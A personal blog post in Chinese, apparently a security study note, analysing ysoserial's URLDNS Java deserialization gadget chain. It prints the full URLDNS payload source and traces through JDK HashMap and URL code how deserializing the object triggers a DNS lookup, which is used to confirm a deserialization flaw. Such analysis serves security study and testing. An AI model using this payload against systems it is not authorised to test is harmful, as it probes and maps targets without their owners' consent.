<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="author" content="John Doe">
    
    
    
    
    
    
    <title>Hexo</title>
    <!-- inject:style -->
    <link href="/css/style.css" rel="stylesheet" type="text/css">
    <!-- endinject -->
    <style>
        .cube-loading {
            top: 0;
            position: fixed;
            width: 100%;
            height: 100%;
            background: url('/images/lg/loading.gif') no-repeat center center;
            background-color: rgba(0,0,0,.7);
        }

        .cube-loading.out {
            display: none;
        }

        .cube-loading:before {
            display: block;
            content: 'Loading';
            position: relative;
            width: 100%;
            top: 50%;
            right: -50%;
            color: #fff;
        }

        @media(max-width: 768px) {
            .cube-loading:before {
                font-size: 1.2em;
                transform: translate(-24px,20px);
                -webkit-transform: translate(-24px,20px);
                -o-transform: translate(-24px,20px);
                -ms-transform: translate(-24px,20px);
            }
        }

        @media(min-width: 768px) {
            .cube-loading:before {

            }
        }
    </style>
    
<meta name="generator" content="Hexo 6.3.0"></head>
<body>
<div class="cube-body">
    <nav id="cube-top-memu" class="cube-menu">
    <ul class="cube-menu-collapse">
        
        <li>
            <i class="cube-icon cube-icon-home" aria-hidden="true"></i>
            <a href="/">首页</a>
        </li>
        
        <li>
            <i class="cube-icon cube-icon-archive" aria-hidden="true"></i>
            <a href="/archives">归档</a>
        </li>
        
        <li>
            <i class="cube-icon cube-icon-categories" aria-hidden="true"></i>
            <a href="/categories">分类</a>
        </li>
        
        <li>
            <i class="cube-icon cube-icon-tags" aria-hidden="true"></i>
            <a href="/tags">标签</a>
        </li>
        
        <li>
            <i class="cube-icon cube-icon-about" aria-hidden="true"></i>
            <a href="/about-me">关于我</a>
        </li>
        
    </ul>
</nav>
<nav class="cube-side-menu" id="cube-side-menu">
    <ul class="cube-menu-list">
        
        <li>
            <a class="lrc-control">Open Lyrics</a>
        </li>
        
        <li>
            <a class="scroll-to-top">Top</a>
        </li>
    </ul>
</nav>
    <header class="cube-header" id="cube-header">
    <img src=" https://api.r10086.com/%E5%9B%BE%E5%8C%85webp/%E6%B5%B7%E8%B4%BC%E7%8E%8B%E6%A8%AA%E5%B1%8F%E7%B3%BB%E5%88%971/wallhaven-0q6vml.webp " alt="头部背景图片">
    
    <div class="cube-type">
        <span class="cube-typed-title">zyzhuv的私人博客</span>
        <span class="cube-typed-cursor">|</span>
    </div>
    
</header>

    <style>
        nav.cube-menu:before {
            content: '';
            visibility: hidden;
            position: absolute;
            left: 0;
            top: 0;
            width: 100%;
            height: 44px;
        
            filter: blur(1px);
            -webkit-filter: blur(1px);
        
            z-index: -1;
            background-image: url('https://api.r10086.com/%E5%9B%BE%E5%8C%85webp/%E6%B5%B7%E8%B4%BC%E7%8E%8B%E6%A8%AA%E5%B1%8F%E7%B3%BB%E5%88%971/wallhaven-0q6vml.webp');
            background-repeat: no-repeat;
            background-position: center -256px;
            background-size: cover;
            background-color: transparent;
        }

        header.cube-background.cube-header-background {
            visibility: hidden;
            background-image: url('https://api.r10086.com/%E5%9B%BE%E5%8C%85webp/%E6%B5%B7%E8%B4%BC%E7%8E%8B%E6%A8%AA%E5%B1%8F%E7%B3%BB%E5%88%971/wallhaven-0q6vml.webp');
            background-position: center -300px;
        }
    </style>
    <header class="cube-background cube-header-background">
        
        <div class="cube-type">
            <span class="cube-typed-title">zyzhuv的私人博客</span>
            <span class="cube-typed-cursor">|</span>
        </div>
        
    </header>
    <div class="load-header-background"></div>
    <script>
        (function (window) {

            window.headerModule = {}
            window.headerModule.image = {
                width: '2000',
                height: '1314'
            }

        })(window)
    </script>
    
    <div class="cube-content">
        <div class="cube-left">
            <div class="cube-article">
    <h1 class="title"></h1>
        
            <div class="cube-article-header">
                <div class="cube-article-date">
                    <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
                    <!-- moment.js对象 -->
                    2024-11-21
                </div>
                <div class="cube-article-tags">
    <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
    
</div>
            </div>
            
                    <div class="cube-article-content cube-markdown">
                        
                            <p>title: URLDNS<br>date: 2024-11-21 19:22:54<br>tags:</p>
<h2 id="JAVA-URLDNS利用链分析"><a href="#JAVA-URLDNS利用链分析" class="headerlink" title="JAVA URLDNS利用链分析"></a>JAVA URLDNS利用链分析</h2><h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h1><p>作用：URLDNS是ysoserial项目中的一条利用链，这条利用链主要用来做验证反序列化漏洞是否存在。</p>
<p>URLDNS利用链有以下特点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、利用链只能发起DNS请求，不能进行其他的利用</span><br><span class="line">2、不限制JDK版本，使用java内置类，对第三方依赖没有要求</span><br><span class="line">3、没有回显，所以可以通过DNS请求来验证反序列化漏洞是否存在</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>URLDNS链验证反序列化漏洞存在的原理：</p>
<p>java.until.hashmap类实现了serializable接口，重写了read0bject方法,再反序列化时会调用hash函数计算key的hashcode。</p>
<p>java.net.URL的hashcode再计算时会调用<code>getHostAddress</code>来解析域名, 从而发出<code>DNS</code>请求</p>
<h4 id="如何利用这些特点来验证这个存在反序列化漏洞呢？"><a href="#如何利用这些特点来验证这个存在反序列化漏洞呢？" class="headerlink" title="如何利用这些特点来验证这个存在反序列化漏洞呢？"></a>如何利用这些特点来验证这个存在反序列化漏洞呢？</h4><p>我们可以构造一个恶意的序列化对象，序列化对象中包含一个恶意的URL地址，当目标将序列化对象进行反序列化时，会调用hash函数计算key的hashcode，然后java.net.URL的hashcode再计算时会调用<code>getHostAddress</code>来解析域名，解析之后会向我们定义的url地址发送请求，从而我们可以验证是否存在反序列化请求。</p>
<h1 id="2-URLDNS利用链分析"><a href="#2-URLDNS利用链分析" class="headerlink" title="2.URLDNS利用链分析"></a>2.URLDNS利用链分析</h1><p>项目地址</p>
<p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial">https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial</a></p>
<p>URLDNS源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">package ysoserial.payloads;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.URLConnection;</span><br><span class="line">import java.net.URLStreamHandler;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.net.URL;</span><br><span class="line"></span><br><span class="line">import ysoserial.payloads.annotation.Authors;</span><br><span class="line">import ysoserial.payloads.annotation.Dependencies;</span><br><span class="line">import ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line">import ysoserial.payloads.util.PayloadRunner;</span><br><span class="line">import ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * A blog post with more details about this gadget chain is at the url below:</span><br><span class="line"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span><br><span class="line"> *</span><br><span class="line"> *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog</span><br><span class="line"> *   posting describing how he modified the Java Commons Collections gadget</span><br><span class="line"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span><br><span class="line"> *   the dependency on Commons Collections and does a DNS lookup with just</span><br><span class="line"> *   standard JDK classes.</span><br><span class="line"> *</span><br><span class="line"> *   The Java URL class has an interesting property on its equals and</span><br><span class="line"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span><br><span class="line"> *   during a comparison (either equals or hashCode).</span><br><span class="line"> *</span><br><span class="line"> *   As part of deserialization, HashMap calls hashCode on each key that it</span><br><span class="line"> *   deserializes, so using a Java URL object as a serialized key allows</span><br><span class="line"> *   it to trigger a DNS lookup.</span><br><span class="line"> *</span><br><span class="line"> *   Gadget Chain:</span><br><span class="line"> *     HashMap.readObject()</span><br><span class="line"> *       HashMap.putVal()</span><br><span class="line"> *         HashMap.hash()</span><br><span class="line"> *           URL.hashCode()</span><br><span class="line"> *</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span><br><span class="line">@PayloadTest(skip = &quot;true&quot;)</span><br><span class="line">@Dependencies()</span><br><span class="line">@Authors(&#123; Authors.GEBL &#125;)</span><br><span class="line">public class URLDNS implements ObjectPayload&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        public Object getObject(final String url) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">                //Avoid DNS resolution during payload creation</span><br><span class="line">                //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br><span class="line">                URLStreamHandler handler = new SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = new HashMap(); // HashMap that will contain the URL</span><br><span class="line">                URL u = new URL(null, url, handler); // URL to use as the Key</span><br><span class="line">                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><span class="line"></span><br><span class="line">                return ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static void main(final String[] args) throws Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="line">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="line">         * using the serialized object.&lt;/p&gt;</span><br><span class="line">         *</span><br><span class="line">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="line">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="line">         * second resolution.&lt;/p&gt;</span><br><span class="line">         */</span><br><span class="line">        static class SilentURLStreamHandler extends URLStreamHandler &#123;</span><br><span class="line"></span><br><span class="line">                protected URLConnection openConnection(URL u) throws IOException &#123;</span><br><span class="line">                        return null;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                protected synchronized InetAddress getHostAddress(URL u) &#123;</span><br><span class="line">                        return null;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>URLDNS链子里面有一个这个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap ht = new HashMap(); </span><br></pre></td></tr></table></figure>



<p>可以看到在这里实例化了一个Hashmap类</p>
<p>我们先了解以下hashmap类：</p>
<p>hashmap是一种常用的集合类，它实现了map接口，可以储存键值对。hashmap使用哈希表来实现，提供了快速的插入，删除和查找工作。</p>
<p>下面是hashmap常用的一些方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">put(key, value)：将指定的键值对存储到HashMap中，如果key已经存在，则会用新的value覆盖旧的value，返回值为旧的                  value或null。</span><br><span class="line">get(key)：返回指定键所映射的值，如果该键不存在，则返回null。</span><br><span class="line">remove(key)：从HashMap中移除指定的键值对，如果该键不存在，则不进行任何操作，返回值为被移除的value或null。</span><br><span class="line">size()：返回HashMap中键值对的数量。</span><br><span class="line">clear()：移除HashMap中的所有键值对。</span><br></pre></td></tr></table></figure>

<p>为啥要谈这个hashmap，因为它重写了readObject()方法</p>
<p>看一下hashmap的readObject</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream.GetField fields = s.readFields();</span><br><span class="line">    float lf = fields.get(&quot;loadFactor&quot;, 0.75F);</span><br><span class="line">    if (!(lf &lt;= 0.0F) &amp;&amp; !Float.isNaN(lf)) &#123;</span><br><span class="line">        lf = Math.min(Math.max(0.25F, lf), 4.0F);</span><br><span class="line">        HashMap.UnsafeHolder.putLoadFactor(this, lf);</span><br><span class="line">        this.reinitialize();</span><br><span class="line">        s.readInt();</span><br><span class="line">        int mappings = s.readInt();</span><br><span class="line">        if (mappings &lt; 0) &#123;</span><br><span class="line">            throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            if (mappings != 0 &amp;&amp; mappings &gt; 0) &#123;</span><br><span class="line">                float fc = (float)mappings / lf + 1.0F;</span><br><span class="line">                int cap = fc &lt; 16.0F ? 16 : (fc &gt;= 1.0737418E9F ? 1073741824 : tableSizeFor((int)fc));</span><br><span class="line">                float ft = (float)cap * lf;</span><br><span class="line">                this.threshold = cap &lt; 1073741824 &amp;&amp; ft &lt; 1.0737418E9F ? (int)ft : Integer.MAX_VALUE;</span><br><span class="line">                SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">                Node&lt;K, V&gt;[] tab = new Node[cap];</span><br><span class="line">                this.table = tab;</span><br><span class="line"></span><br><span class="line">                for(int i = 0; i &lt; mappings; ++i) &#123;</span><br><span class="line">                    K key = s.readObject();</span><br><span class="line">                    V value = s.readObject();</span><br><span class="line">                    this.putVal(hash(key), key, value, false, false);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal load factor: &quot; + lf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Node&lt;K, V&gt; newNode(int hash, K key, V value, Node&lt;K, V&gt; next) &#123;</span><br><span class="line">    return new Node(hash, key, value, next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Node&lt;K, V&gt; replacementNode(Node&lt;K, V&gt; p, Node&lt;K, V&gt; next) &#123;</span><br><span class="line">    return new Node(p.hash, p.key, p.value, next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TreeNode&lt;K, V&gt; newTreeNode(int hash, K key, V value, Node&lt;K, V&gt; next) &#123;</span><br><span class="line">    return new TreeNode(hash, key, value, next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TreeNode&lt;K, V&gt; replacementTreeNode(Node&lt;K, V&gt; p, Node&lt;K, V&gt; next) &#123;</span><br><span class="line">    return new TreeNode(p.hash, p.key, p.value, next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要是这</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.putVal(hash(key), key, value, false, false);</span><br></pre></td></tr></table></figure>

<p>可以跟一下hash</p>
<p><img src="/2024/11/21/URLDNS/1.png" alt="URLDNS"></p>
<p>可以看到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key ！== null  调用 key.hashCode()</span><br></pre></td></tr></table></figure>

<p>这个key 是K key &#x3D; s.readObject(); 也就是反序列化的对象</p>
<p>回去DNSURL看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URLStreamHandler handler = new SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">HashMap ht = new HashMap(); // HashMap that will contain the URL</span><br><span class="line">URL u = new URL(null, url, handler); // URL to use as the Key</span><br></pre></td></tr></table></figure>

<p>实例化了URLStreamHandler，还实例化了URL，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ht.put(u, url);</span><br></pre></td></tr></table></figure>

<p>ht是HashMap的实例</p>
<p>跟进put</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">     return this.putVal(hash(key), key, value, false, true);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>调用了putVal  这个key是u 是URL的实例</p>
<p>跟进hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line">    int h;</span><br><span class="line">    return key == null ? 0 : (h = key.hashCode()) ^ h &gt;&gt;&gt; 16;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到了</p>
<p> key.hashCode()  是 URL.hashCode()</p>
<p>看 URL的hashCode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public synchronized int hashCode() &#123;</span><br><span class="line">    if (this.hashCode != -1) &#123;</span><br><span class="line">        return this.hashCode;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        this.hashCode = this.handler.hashCode(this);</span><br><span class="line">        return this.hashCode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如何hashCode&#x3D;-1 </p>
<p>调用.handler.hashCode(this);</p>
<p>handler是URLStreamHandle的实例</p>
<p>handler是URLStreamHandle下的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">protected int hashCode(URL u) &#123;</span><br><span class="line">    int h = 0;</span><br><span class="line">    String protocol = u.getProtocol();</span><br><span class="line">    if (protocol != null) &#123;</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    InetAddress addr = this.getHostAddress(u);</span><br><span class="line">    String file;</span><br><span class="line">    if (addr != null) &#123;</span><br><span class="line">        h += addr.hashCode();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        file = u.getHost();</span><br><span class="line">        if (file != null) &#123;</span><br><span class="line">            h += file.toLowerCase().hashCode();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    file = u.getFile();</span><br><span class="line">    if (file != null) &#123;</span><br><span class="line">        h += file.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (u.getPort() == -1) &#123;</span><br><span class="line">        h += this.getDefaultPort();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        h += u.getPort();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String ref = u.getRef();</span><br><span class="line">    if (ref != null) &#123;</span><br><span class="line">        h += ref.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到getHostAddress(u);</p>
<p>去跟进getHostAddress</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected InetAddress getHostAddress(URL u) &#123;</span><br><span class="line">    return u.getHostAddress();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>继续跟进getHostAddress</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">synchronized InetAddress getHostAddress() &#123;</span><br><span class="line">      if (this.hostAddress != null) &#123;</span><br><span class="line">          return this.hostAddress;</span><br><span class="line">      &#125; else if (this.host != null &amp;&amp; !this.host.isEmpty()) &#123;</span><br><span class="line">          try &#123;</span><br><span class="line">              this.hostAddress = InetAddress.getByName(this.host);</span><br><span class="line">          &#125; catch (SecurityException | UnknownHostException var2) &#123;</span><br><span class="line">              return null;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          return this.hostAddress;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">          return null;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p> InetAddress.getByName(this.host); 看到这个</p>
<p><code>InetAddress.getByName()</code> 是Java中的一个方法，它将主机名或IP地址字符串作为参数，并返回一个表示其网络地址的 <code>InetAddress</code> 对象。如果参数是主机名，<code>getByName()</code> 方法将查询DNS以查找该主机名的IP地址。如果参数是IP地址字符串，则该方法将返回一个表示该IP地址的 <code>InetAddress</code> 对象。该方法可能会抛出 <code>UnknownHostException</code> 异常，如果主机名无法解析或IP地址无效，则会抛出该异常。</p>
<p>相当于一次dns解析</p>
<p>所以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">HashMap.hash</span><br><span class="line">URL.hashCode</span><br><span class="line">URLStreamHandler.hashCode</span><br><span class="line">URLStreamHandler.getHostAddress</span><br><span class="line">URL.getHostAddress.InetAddress.getByName(host)</span><br></pre></td></tr></table></figure>

<p>简化版</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            URL.hashCode()</span><br></pre></td></tr></table></figure>



<p>那用的URL的hashcode 那 用hashmap干啥</p>
<p>URL的readObject没调用hashcode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">K key = (K) s.readObject();</span><br></pre></td></tr></table></figure>

<p>key 是从序列化出来的</p>
<p>之前调用writeObiect</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private void writeObject(ObjectOutputStream s) throws IOException &#123;</span><br><span class="line">     int buckets = this.capacity();</span><br><span class="line">     s.defaultWriteObject();</span><br><span class="line">     s.writeInt(buckets);</span><br><span class="line">     s.writeInt(this.size);</span><br><span class="line">     this.internalWriteEntries(s);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>发现调用this.internalWriteEntries(s);</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">void internalWriteEntries(ObjectOutputStream s) throws IOException &#123;</span><br><span class="line">     Node[] tab;</span><br><span class="line">     if (this.size &gt; 0 &amp;&amp; (tab = this.table) != null) &#123;</span><br><span class="line">         Node[] var3 = tab;</span><br><span class="line">         int var4 = tab.length;</span><br><span class="line"></span><br><span class="line">         for(int var5 = 0; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">             for(Node&lt;K, V&gt; e = var3[var5]; e != null; e = e.next) &#123;</span><br><span class="line">                 s.writeObject(e.key);</span><br><span class="line">                 s.writeObject(e.value);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>key和value在tables获取，</p>
<p>在hashmap的readObject里有tables</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">Node&lt;K, V&gt;[] tab = new Node[cap];</span><br><span class="line">this.table = tab;</span><br></pre></td></tr></table></figure>

<p>URLDNS的put会触发DNS查询</p>
<p>hashmap的readObject</p>
<p>也会触发</p>
<p>避免了URLDNS的put一次dns</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.putVal(hash(key), key, value, false, false);</span><br></pre></td></tr></table></figure>

